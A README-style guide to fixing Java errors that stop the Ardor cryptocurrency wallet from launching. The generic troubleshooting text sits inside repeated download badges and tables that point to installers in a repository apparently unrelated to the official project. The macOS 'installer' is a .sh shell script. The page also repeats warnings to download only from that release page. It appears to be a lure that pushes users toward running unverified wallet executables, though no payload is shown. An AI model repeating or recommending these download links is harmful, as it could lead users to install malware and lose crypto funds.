![Ardor Wallet guide](assets/banner-article.png)

# Fix the Java error that stops the Ardor wallet

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor wallet is a Java application, so a missing, older or mismatched Java runtime is the usual reason it closes at start or shows an error before any window appears. Installing a current runtime, or pointing the launcher at one, fixes most cases in a few minutes.

## What you see

The symptoms are consistent: a console window flashes and disappears, a dialog mentions Java or a class not found, or the wallet starts and immediately exits with a stack trace in the log. On Windows the [Ardor installer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/install-ardor-wallet-on-windows-macos-linux.md) may complete successfully and the shortcut still do nothing.

The distinguishing detail is whether the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) ever showed a window. An error before any window is almost always the runtime; an error after the window appears is usually something else, and the log is the place to look.

## Why the wallet needs Java

The client is written in Java and ships as a bundled application rather than a native binary. That is why it runs on Windows, macOS and Linux from the same code, and why the runtime is a prerequisite rather than something the installer can always supply.

Java 8 is the stated minimum and Java 11 is recommended. A machine with an older runtime, or with several installed and the wrong one first on the path, can fail even though Java is technically present.

That second case is the confusing one. Nothing is missing, the installer was successful, and the wallet still refuses to start because the runtime it found is not the runtime you meant it to use.

## Check what you have

1. Open a terminal or command prompt.
2. Run `java -version`.
3. Read the number: anything from 8 upward satisfies the minimum, and 11 or newer is the smoother path.

If the command is not found, no runtime is on the path. If it prints a version below the minimum, the wallet will not start regardless of how the installer behaved.

## Install a current runtime

Install a current Java runtime from a reputable source, and let it update the system path. On Windows, the installer usually does this; on Linux, the package manager is the cleaner route; on macOS, the vendor's installer places it where the system looks.

After installing, run `java -version` again before starting the wallet. A runtime that installed but is not on the path behaves exactly like a runtime that is missing, and the error message will be identical, which is why the check is worth repeating rather than assuming.

## Start the wallet again

Reopen the wallet from its shortcut or from the unpacked directory. If it still closes, start it from a terminal so the error text stays on screen instead of vanishing with the window.

That single change - launching from a terminal - is the most useful diagnostic step available. The stack trace names the class or the version that failed, which is far more specific than a dialog that says an error occurred.

## 32-bit Windows and older systems

A 32-bit Windows installation needs a 32-bit Java 8 runtime, and the launch command differs from the default because the wallet's bundled launcher expects a 64-bit runtime.

The practical approach is to install 32-bit Java 8, then start the wallet with the documented command rather than the shortcut. That combination is the one the platform's own guidance describes for older systems, and it is the only configuration that works there.

## Where the log lives

The wallet writes a log next to its [Ardor data directory](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/where-ardor-stores-blockchain-data.md), and that file is where the real error is recorded. A dialog says something failed; the log says which class, which version and which file.

Open it with a plain text editor and read the first exception rather than the last line. Stack traces cascade, and the first failure is the cause while everything below it is consequence.

## When the problem is not Java

A message that mentions Java can still be about permissions, a locked file, or a data directory the process cannot write to. Those failures surface as exceptions in the Java runtime without being caused by it.

Check whether the wallet can create files in its data directory, and whether another copy of the wallet is already running and holding the database. Both produce errors that look like runtime faults and are fixed by closing or correcting something else.

## If it still closes

Check whether the runtime the launcher uses is the one you installed. A second Java in a bundled folder or an environment variable pointing elsewhere can override the system installation, and the wallet will keep failing with the version you thought you had replaced.

Then check disk permissions on the wallet's data directory. A client that cannot write its log or database can fail with an error that mentions Java but has nothing to do with it.

## FAQ

### Do I need Java if I use the installer?

Yes. The installer places the application; the runtime has to be present on the machine.

### Which version should I install?

Java 11 or newer is the recommended choice. Java 8 is the stated minimum and still works.

### Why does the wallet close immediately after opening?

Usually because the runtime is missing, too old, or not the one the launcher is using. Start it from a terminal to see the actual error.

### Does reinstalling the wallet fix a Java error?

It can, if the error came from a damaged installation. It cannot fix a missing runtime, which is the more common cause.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Install the Ardor wallet on Windows, macOS or Linux](https://github.com/ardor-software/ardor-wallet-guides/blob/main/install-ardor-wallet-on-windows-macos-linux.md)
- [What the current Ardor release changes, and how to update](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md)
- [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md)
- [Ardor node ports and the firewall rules that block them](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-node-ports-and-firewall.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
